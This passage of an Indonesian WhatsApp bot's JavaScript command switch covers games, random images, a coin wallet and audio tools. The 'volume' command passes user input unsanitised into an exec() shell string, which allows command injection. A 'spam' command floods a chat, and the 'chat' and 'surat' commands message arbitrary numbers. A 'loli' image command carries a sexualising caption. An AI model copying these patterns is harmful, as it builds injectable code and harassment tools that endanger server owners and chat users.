					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipubg1 botwea`)
                    reply(dla.wait())
                    sertipubg = await getBuffer(`http://onlydevcity.xyz/PubgTourSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipubg, image, { quoted: Lan })
                    break
                    case 'sertipubg2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipubg2 botwea`)
                    reply(dla.wait())
                    sertipub = await getBuffer(`http://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipub, image, { quoted: Lan })
                    break
                    case 'sertiml':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiml botwea`)
                    reply(dla.wait())
                    sertim = await getBuffer(`http://onlydevcity.xyz/MLTourSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertim, image, { quoted: Lan })
                    break
				case 'gabutmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const gabut = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}tebakgambar\`\`\`
\`\`\`│◪ ${prefix}caklontong\`\`\`
\`\`\`│◪ ${prefix}bisakah\`\`\`
\`\`\`│◪ ${prefix}kapankah\`\`\`
\`\`\`│◪ ${prefix}apakah\`\`\`
\`\`\`│◪ ${prefix}spam\`\`\`
\`\`\`│◪ ${prefix}tag\`\`\`
\`\`\`│◪ ${prefix}chat\`\`\`
\`\`\`│◪ ${prefix}surat\`\`\`
\`\`\`│◪ ${prefix}slot\`\`\`
\`\`\`│◪ ${prefix}xox\`\`\`
\`\`\`│◪ ${prefix}rate\`\`\`
\`\`\`│◪ ${prefix}hobby\`\`\`
\`\`\`│◪ ${prefix}truth\`\`\`
\`\`\`│◪ ${prefix}dare\`\`\`
\`\`\`│◪ ${prefix}cekbapak\`\`\`
\`\`\`│◪ ${prefix}seberapagay\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, gabut, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Gabut Menu', orderTitle: 'Gabut Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'xox':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
            const somtoyy = sotoyy[Math.floor(Math.random() * sotoyy.length)]
            dila.sendMessage(from, `[  🎰 | X O X ]\n-----------------\n\n*${somtoyy}*\n\n-----------------\n[  🎰 | XOX ]\n\nKeterangan : Jika anda Mendapatkan Huruf O 3 Huruf Berarti Anda Menang\n\nContoh : O : O : O<=====`, MessageType.text, { quoted: Lan })
            break
            case 'slot':
            case 'slots':
            if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            dila.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: Lan })
            break
					case 'spam':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					dila.sendMessage(from, argzi[0], MessageType.text)
				}
				break
					case 'tag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					const tagq = {
					text: `@${nomqm.split('@')[0]} tag!`,
					contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}
					}
					dila.sendMessage(from, tagq, MessageType.text)
			break
			case 'chat':
			if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|hallo`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            dila.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
            case 'surat':
                if (isBanned) return reply(dla.baned())
			    if (!isRegistered) return reply(dla.noregis())
                if (args.length < 1) return reply(`Penggunaan ${prefix}surat 62xnxx|Isi surat`)
				const textp = body.slice(7)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				dila.sendMessage(`${noorg2}@s.whatsapp.net`,`┌─❏ Surat*
│╭◪
│├ Dari : ${pushname}
│├ Nomor : @${sender.split("@")[0]}
│├ Untuk : Anda
│╰◪
├❏ *Isi Surat*
│╭◪
│├ ${katakita2}
│╰◪
├❏ *Balas Surat*
│╭◪
│├ Untuk Membalas Ketik:
│├ #surat 62xnxx|Hai Juga
│├ Nomor Harus Diawali 62
│╰◪
└─❏ *${botName}*`, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg"), mimetype: "application/octet-stream",title: `${botName}`, fileLength: "36", pageCount: 0, fileName: `Surat dari ${pushname}`}}, messageTimestamp: "1614069378", status: "PENDING"}, contextInfo: {"mentionedJid": [sender] }})
				reply(`Sukses mengirim surat:\n${katakita2}`)
				break
				case 'seberapagay':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				anu = await fetchJson(`https://arugaz.herokuapp.com/api/howgay`, {method: 'get'})
				hasil = `Nih Liat Data Gay Si ${q}\n\n\nPersentase Gay : ${anu.persen}%\nAlert!!! : ${anu.desc}`
				reply(hasil)
				break
				case 'tebakgambar':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Jawab terlebih dahulu pertanyaan sebelumnya")
                    get_result = await fetchJson(`https://videfikri.com/api/tebakgambar/`)
                    result = get_result.result
                    ini_image = result.soal_gbr
                    jawaban = result.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    ini_buffer = await getBuffer(ini_image)
                    dila.sendMessage(from, ini_buffer, image, { quoted: Lan, caption: "_Jawab pertanyaan berikut!_\nBatas waktu 50detik" })
                    await sleep(50000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://api.vhtear.com/funkuis&apikey=${vhtear}`)
					setTimeout(() => {
						dila.sendMessage(from, '*❏ Jawaban :* ' + anu.result.jawaban + '\n' + anu.result.desk, text, { quoted: Lan })
					}, 30000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, anu.result.soal, text, { quoted: Lan })
					}, 0) // 1000 = 1s,
					break

				case 'bisakah':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					bisakah = body.slice(1)
					const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + bisakah + '*\n\nJawaban : ' + keh, text, { quoted: Lan })
					break

					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					kapankah = body.slice(1)
					const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + kapankah + '*\n\nJawaban : ' + koh, text, { quoted: Lan })
					break

				case 'apakah':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					apakah = body.slice(1)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + apakah + '*\n\nJawaban : ' + kah, text, { quoted: Lan })
					break

				case 'rate':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					rate = body.slice(1)
					const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + rate + '*\n\nJawaban : ' + te + '%', text, { quoted: Lan })
					break

				case 'hobby':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					hobby = body.slice(1)
					const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by, text, { quoted: Lan })
					break

				case 'truth':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					dila.sendMessage(from, truteh, image, { caption: '*Truth*\n\n' + ttrth, quoted: Lan })
					break

				case 'dare':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					dila.sendMessage(from, tod, image, { quoted: Lan, caption: '*Dare*\n\n' + der })
					break

				case 'cekbapak': // By Ramlan ID
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					dila.sendMessage(from, cek, text, { quoted: Lan })
					break

				case 'randommenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const random = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}gachacewek\`\`\`
\`\`\`│◪ ${prefix}gachacowok\`\`\`
\`\`\`│◪ ${prefix}sagiri\`\`\`
\`\`\`│◪ ${prefix}megumin\`\`\`
\`\`\`│◪ ${prefix}waifu\`\`\`
\`\`\`│◪ ${prefix}neko\`\`\`
\`\`\`│◪ ${prefix}shinobu\`\`\`
\`\`\`│◪ ${prefix}loli\`\`\`
\`\`\`│◪ ${prefix}nekonime\`\`\`
\`\`\`│◪ ${prefix}darkjokes\`\`\`
\`\`\`│◪ ${prefix}meme\`\`\`
\`\`\`│◪ ${prefix}estetik\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, random, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Random Menu', orderTitle: 'Random Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break

				case 'gachacewek':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/cewek.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, 'Jadi Gimana Bwang?:v')
					break

				case 'gachacowok':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/cowok.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, 'Jadi Gimana Mba?:v')
					break
				case 'meme':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
					mimi = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=${xteam}`)
					dila.sendMessage(from, mimi, image, { quoted: Lan })
					break

				case 'darkjokes':
				case 'darkjoke':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, '*GELAP BOS :V*')
					break
			case 'waifu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/waifu`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan, caption: "Wibu AbiZzz"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'neko':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/neko`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'megumin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/megumin`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'shinobu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/shinobu`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
				case 'loli':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
					lomli = await getBuffer(`https://docs-jojo.herokuapp.com/api/randomloli`)
					dila.sendMessage(from, lomli, image, { quoted: Lan, caption: 'Cintai Loli Mu>_<' })
					break

				case 'nekonime':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/random2/neko?apikey=pensiB`)
					reply(dla.wait())
					neko = await getBuffer(anu.result.url_gbr)
					dila.sendMessage(from, neko, image, { quoted: Lan, caption: 'Nekonime >_<' })
					break

				case 'sagiri':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					sagi = await getBuffer(`http://lolhuman.herokuapp.com/api/random/sagiri?apikey=pensiB`)
					reply(dla.wait())
					dila.sendMessage(from, sagi, image, { quoted: Lan })
					break
				case 'estetik':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=apivinz`)
					reply(dla.wait())
					este = await getBuffer(anu.result.result)
					dila.sendMessage(from, este, image, { quoted: Lan })
				break
					
				case 'dompetmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const dompet = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}limit\`\`\`
\`\`\`│◪ ${prefix}transfer\`\`\`
\`\`\`│◪ ${prefix}atm\`\`\`
\`\`\`│◪ ${prefix}buylimit\`\`\`
\`\`\`│◪ ${prefix}premiumlist\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, dompet, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Dompet Menu', orderTitle: 'Dompet Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break

				case 'limit':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					checkLimit(sender)
					break

				case 'transfer':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q.includes('|')) return reply(dla.wrongf())
					const tujuan = q.substring(0, q.indexOf('|') - 1)
					const jumblah = q.substring(q.lastIndexOf('|') + 1)
					if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
					const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
					fee = 0.005 * jumblah
					hasiltf = jumblah - fee
					addKoinUser(tujuantf, hasiltf)
					confirmATM(sender, jumblah)
					addKoinUser(`${ownerNumber}`, fee)
					reply(`*「 SUKSES 」*\n\npengiriman uang berhasil\n❏ dari : +${sender.split("@")[0]}\n❏ ke : +${tujuan}\n❏ jumlah transfer : ${jumblah}\n❏ pajak : ${fee}`)
					break

				case 'atm':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					const kantong = checkATMuser(sender)
					reply(dla.uangkau(pushname, sender, kantong))
					break

				case 'buylimit':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					payout = body.slice(10)
					const koinPerlimit = 1000
					const totald = koinPerlimit * payout
					if (checkATMuser(sender) <= totald) return reply(`maaf kak uang nya gak cukup, kumpulin uang nya dumlu >_< jangan open bo kak:v`)
					if (checkATMuser(sender) >= totald) {
						confirmATM(sender, totald)
						bayarLimit(sender, payout)
						await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n❏ pengirim : ${ownerName}\n❏ penerima : ${pushname}\n❏ nominal pembelian : ${payout} \n❏ harga limit : ${koinPerlimit}/limit\n❏ sisa uang : ${checkATMuser(sender)}\n\nproses berhasil dengan SN\n${createSerial(15)}`)
					}
					break
				case 'toolsmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const tools = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}tomp3\`\`\`
\`\`\`│◪ ${prefix}tomp4\`\`\`
\`\`\`│◪ ${prefix}toimg\`\`\`
\`\`\`│◪ ${prefix}toptt\`\`\`
\`\`\`│◪ ${prefix}detikvn\`\`\`
\`\`\`│◪ ${prefix}detikvideo\`\`\`
\`\`\`│◪ ${prefix}imgtourl\`\`\`
\`\`\`│◪ ${prefix}bitly\`\`\`
\`\`\`│◪ ${prefix}trigered\`\`\`
\`\`\`│◪ ${prefix}komenyt\`\`\`
\`\`\`│◪ ${prefix}volume\`\`\`
\`\`\`│◪ ${prefix}nightcore\`\`\`
\`\`\`│◪ ${prefix}slow\`\`\`
\`\`\`│◪ ${prefix}tupai\`\`\`
\`\`\`│◪ ${prefix}blub\`\`\`
\`\`\`│◪ ${prefix}gemuk\`\`\`
\`\`\`│◪ ${prefix}ghost\`\`\`
\`\`\`│◪ ${prefix}bass\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, tools, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Tools Menu', orderTitle: 'Tools Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'volume':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						dila.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted:Lan})
						fs.unlinkSync(ran)
					})
				break
					case 'tomp4':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
                                        if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(dla.wait())
            if ((isMedia && !Lan.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            owgi = await dila.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
				
				case 'tomp3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.updatePresence(from, Presence.composing)
